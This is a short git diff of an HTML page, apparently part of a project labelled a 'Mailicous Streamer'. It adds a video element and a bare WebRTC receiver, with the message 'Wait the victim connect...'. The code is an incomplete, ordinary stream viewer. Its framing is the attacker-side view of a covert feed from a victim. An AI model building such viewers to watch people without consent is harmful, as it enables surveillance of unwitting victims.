@@ -1,11 +1,18 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Streamer</title>
+<meta charset="UTF-8">
+<title>Mailicous Streamer</title>
 </head>
 <body>
-    <h1>Streaming Website</h1>
+<video id="remoteVideo" autoplay playsinline controls></video>
+
+<script>
+const pc = new RTCPeerConnection();
+pc.ontrack = e => {
+    document.getElementById("remoteVideo").srcObject = e.streams[0];
+};
+</script>
+<p>Wait the victim connect...</p>
 </body>
 </html>
